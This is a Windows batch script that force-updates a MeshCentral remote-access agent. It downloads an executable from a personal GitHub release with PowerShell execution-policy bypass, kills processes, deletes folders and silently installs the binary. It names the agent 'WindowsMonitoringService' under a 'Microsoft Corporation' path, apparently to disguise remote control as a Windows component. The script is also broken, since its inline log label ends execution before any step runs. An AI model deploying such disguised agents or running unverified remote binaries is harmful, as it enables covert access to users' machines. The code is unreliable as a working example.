@echo off
setlocal enabledelayedexpansion

:: ============================================================================
:: Mesh Agent Force Update Script
:: Description: Safely updates Mesh Agent without losing remote access
:: ============================================================================

:: Check for --yes argument
set "CONFIRMED=0"
if "%~1"=="--yes" set "CONFIRMED=1"

if "%CONFIRMED%"=="0" (
    echo This script will force update the Mesh Agent.
    echo Please run with --yes argument to confirm.
    exit /b 1
)

:: Setup paths and variables
set "TEMP_DIR=%TEMP%\MeshAgentUpdate_%RANDOM%"
set "LOG_FILE=%TEMP%\MeshAgentUpdate_%date:~-4,4%%date:~-10,2%%date:~-7,2%_%time:~0,2%%time:~3,2%%time:~6,2%.log"
set "LOG_FILE=%LOG_FILE: =0%"
set "NEW_AGENT_URL=https://github.com/LightZirconite/MeshAgent/releases/download/exe/WindowsMonitoringService64-Lol.exe"
set "NEW_AGENT_FILE=%TEMP_DIR%\WindowsMonitoringService64-Lol.exe"

:: Known agent locations to search
set "SEARCH_PATHS[0]=Mesh Agent"
set "SEARCH_PATHS[1]=LGTW"
set "SEARCH_PATHS[2]=LGTWAgent"
set "SEARCH_PATHS[3]=Microsoft Corporation\WindowsMonitoringService"

:: Known agent process names
set "PROCESS_NAMES[0]=MeshAgent.exe"
set "PROCESS_NAMES[1]=MeshService.exe"
set "PROCESS_NAMES[2]=WindowsMonitoringService64.exe"
set "PROCESS_NAMES[3]=WindowsMonitoringService64-Lol.exe"
set "PROCESS_NAMES[4]=MeshAgent64.exe"

:: ============================================================================
:: Logging function
:: ============================================================================
:log
echo [%date% %time%] %~1
echo [%date% %time%] %~1 >> "%LOG_FILE%" 2>&1
goto :eof

:: ============================================================================
:: STEP 1: Initialize
:: ============================================================================
call :log "================================================"
call :log "Starting Mesh Agent Force Update"
call :log "================================================"
call :log "Log file: %LOG_FILE%"

:: Create temporary directory
if not exist "%TEMP_DIR%" (
    mkdir "%TEMP_DIR%"
    if errorlevel 1 (
        call :log "ERROR: Failed to create temporary directory"
        exit /b 1
    )
)
call :log "Temporary directory created: %TEMP_DIR%"

:: ============================================================================
:: STEP 2: Download new agent (CRITICAL - Do this FIRST)
:: ============================================================================
call :log "================================================"
call :log "STEP 1: Downloading new agent installer"
call :log "URL: %NEW_AGENT_URL%"
call :log "================================================"

powershell -NoProfile -ExecutionPolicy Bypass -Command "try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -UseBasicParsing -Uri '%NEW_AGENT_URL%' -OutFile '%NEW_AGENT_FILE%' -ErrorAction Stop; exit 0 } catch { Write-Host $_.Exception.Message; exit 1 }" >> "%LOG_FILE%" 2>&1

if errorlevel 1 (
    call :log "ERROR: Failed to download new agent installer"
    call :log "CRITICAL: Aborting update to prevent losing remote access"
    goto :cleanup_exit
)

:: Verify the downloaded file exists and has reasonable size
if not exist "%NEW_AGENT_FILE%" (
    call :log "ERROR: Downloaded file does not exist"
    call :log "CRITICAL: Aborting update to prevent losing remote access"
    goto :cleanup_exit
)

for %%F in ("%NEW_AGENT_FILE%") do set "FILE_SIZE=%%~zF"
if %FILE_SIZE% LSS 100000 (
    call :log "ERROR: Downloaded file is too small (%FILE_SIZE% bytes)"
    call :log "CRITICAL: Aborting update to prevent losing remote access"
    goto :cleanup_exit
)

call :log "SUCCESS: New agent downloaded successfully (%FILE_SIZE% bytes)"

:: ============================================================================
:: STEP 3: Find existing agent installations
:: ============================================================================
call :log "================================================"
call :log "STEP 2: Locating existing agent installations"
call :log "================================================"

set "FOUND_COUNT=0"
set "INSTALL_PATHS="

:: Search in Program Files
for /L %%i in (0,1,3) do (
    if defined SEARCH_PATHS[%%i] (
        set "SEARCH_PATH=!SEARCH_PATHS[%%i]!"
        
        :: Check both Program Files locations
        if exist "%ProgramFiles%\!SEARCH_PATH!" (
            call :log "Found installation: %ProgramFiles%\!SEARCH_PATH!"
            set "INSTALL_PATHS[!FOUND_COUNT!]=%ProgramFiles%\!SEARCH_PATH!"
            set /a FOUND_COUNT+=1
        )
        
        if exist "%ProgramFiles(x86)%\!SEARCH_PATH!" (
            call :log "Found installation: %ProgramFiles(x86)%\!SEARCH_PATH!"
            set "INSTALL_PATHS[!FOUND_COUNT!]=%ProgramFiles(x86)%\!SEARCH_PATH!"
            set /a FOUND_COUNT+=1
        )
    )
)

call :log "Total installations found: %FOUND_COUNT%"

:: ============================================================================
:: STEP 4: Stop all agent processes
:: ============================================================================
call :log "================================================"
call :log "STEP 3: Stopping agent processes"
call :log "================================================"

for /L %%i in (0,1,4) do (
    if defined PROCESS_NAMES[%%i] (
        set "PROC_NAME=!PROCESS_NAMES[%%i]!"
        
        tasklist /FI "IMAGENAME eq !PROC_NAME!" 2>NUL | find /I "!PROC_NAME!" >NUL
        if not errorlevel 1 (
            call :log "Stopping process: !PROC_NAME!"
            taskkill /F /IM "!PROC_NAME!" /T >> "%LOG_FILE%" 2>&1
            timeout /t 2 /nobreak >NUL
        )
    )
)

call :log "All agent processes stopped"

:: ============================================================================
:: STEP 5: Stop agent services
:: ============================================================================
call :log "================================================"
call :log "STEP 4: Stopping agent services"
call :log "================================================"

:: Try to stop common service names
for %%S in ("Mesh Agent" "MeshAgent" "LGTWAgent" "WindowsMonitoringService") do (
    sc query %%~S >NUL 2>&1
    if not errorlevel 1 (
        call :log "Stopping service: %%~S"
        sc stop %%~S >> "%LOG_FILE%" 2>&1
        timeout /t 3 /nobreak >NUL
    )
)

:: ============================================================================
:: STEP 6: Uninstall old agents
:: ============================================================================
call :log "================================================"
call :log "STEP 5: Uninstalling old agents"
call :log "================================================"

if %FOUND_COUNT% GTR 0 (
    for /L %%i in (0,1,%FOUND_COUNT%) do (
        if defined INSTALL_PATHS[%%i] (
            set "INST_PATH=!INSTALL_PATHS[%%i]!"
            call :log "Processing: !INST_PATH!"
            
            :: Look for uninstaller
            if exist "!INST_PATH!\MeshAgent.exe" (
                call :log "Running uninstaller: !INST_PATH!\MeshAgent.exe -uninstall"
                "!INST_PATH!\MeshAgent.exe" -uninstall >> "%LOG_FILE%" 2>&1
                timeout /t 5 /nobreak >NUL
            )
            
            if exist "!INST_PATH!\MeshService.exe" (
                call :log "Running uninstaller: !INST_PATH!\MeshService.exe -uninstall"
                "!INST_PATH!\MeshService.exe" -uninstall >> "%LOG_FILE%" 2>&1
                timeout /t 5 /nobreak >NUL
            )
            
            if exist "!INST_PATH!\WindowsMonitoringService64.exe" (
                call :log "Running uninstaller: !INST_PATH!\WindowsMonitoringService64.exe -uninstall"
                "!INST_PATH!\WindowsMonitoringService64.exe" -uninstall >> "%LOG_FILE%" 2>&1
                timeout /t 5 /nobreak >NUL
            )
        )
    )
) else (
    call :log "No existing installations to uninstall"
)

:: Wait for services to fully stop
timeout /t 5 /nobreak >NUL

:: ============================================================================
:: STEP 7: Delete old installation directories
:: ============================================================================
call :log "================================================"
call :log "STEP 6: Deleting old installation directories"
call :log "================================================"

if %FOUND_COUNT% GTR 0 (
    for /L %%i in (0,1,%FOUND_COUNT%) do (
        if defined INSTALL_PATHS[%%i] (
            set "INST_PATH=!INSTALL_PATHS[%%i]!"
            
            if exist "!INST_PATH!" (
                call :log "Deleting directory: !INST_PATH!"
                rd /s /q "!INST_PATH!" >> "%LOG_FILE%" 2>&1
                
                :: Verify deletion
                if exist "!INST_PATH!" (
                    call :log "WARNING: Failed to delete !INST_PATH!"
                ) else (
                    call :log "SUCCESS: Deleted !INST_PATH!"
                )
            )
        )
    )
)

:: ============================================================================
:: STEP 8: Install new agent
:: ============================================================================
call :log "================================================"
call :log "STEP 7: Installing new agent"
call :log "================================================"

call :log "Running installer: %NEW_AGENT_FILE% --fullinstall"
"%NEW_AGENT_FILE%" --fullinstall >> "%LOG_FILE%" 2>&1

if errorlevel 1 (
    call :log "WARNING: Installer returned error code %errorlevel%"
    call :log "Check if installation completed despite error"
) else (
    call :log "Installer executed successfully"
)

:: Wait for installation to complete
timeout /t 10 /nobreak >NUL

:: ============================================================================
:: STEP 9: Verify new installation
:: ============================================================================
call :log "================================================"
call :log "STEP 8: Verifying new installation"
call :log "================================================"

set "NEW_INSTALL_VERIFIED=0"

:: Check if new service is running
for %%S in ("Mesh Agent" "MeshAgent" "LGTWAgent" "WindowsMonitoringService") do (
    sc query %%~S 2>NUL | find "RUNNING" >NUL
    if not errorlevel 1 (
        call :log "SUCCESS: Service %%~S is running"
        set "NEW_INSTALL_VERIFIED=1"
    )
)

:: Check if new process is running
for /L %%i in (0,1,4) do (
    if defined PROCESS_NAMES[%%i] (
        set "PROC_NAME=!PROCESS_NAMES[%%i]!"
        tasklist /FI "IMAGENAME eq !PROC_NAME!" 2>NUL | find /I "!PROC_NAME!" >NUL
        if not errorlevel 1 (
            call :log "SUCCESS: Process !PROC_NAME! is running"
            set "NEW_INSTALL_VERIFIED=1"
        )
    )
)

if "%NEW_INSTALL_VERIFIED%"=="0" (
    call :log "WARNING: Could not verify new agent is running"
    call :log "This may be normal if agent starts later"
) else (
    call :log "SUCCESS: New agent installation verified"
)

:: ============================================================================
:: STEP 10: Cleanup
:: ============================================================================
:cleanup_exit
call :log "================================================"
call :log "STEP 9: Cleanup"
call :log "================================================"

:: Delete temporary installer
if exist "%NEW_AGENT_FILE%" (
    call :log "Deleting temporary installer: %NEW_AGENT_FILE%"
    del /f /q "%NEW_AGENT_FILE%" >> "%LOG_FILE%" 2>&1
)

:: Delete temporary directory
if exist "%TEMP_DIR%" (
    call :log "Deleting temporary directory: %TEMP_DIR%"
    rd /s /q "%TEMP_DIR%" >> "%LOG_FILE%" 2>&1
)

call :log "================================================"
call :log "Mesh Agent Force Update Completed"
call :log "Log file will remain at: %LOG_FILE%"
call :log "================================================"

:: Self-delete script after 30 seconds (optional)
:: (start /b cmd /c "timeout /t 30 /nobreak >NUL & del /f /q "%~f0"") >NUL 2>&1

endlocal
exit /b 0
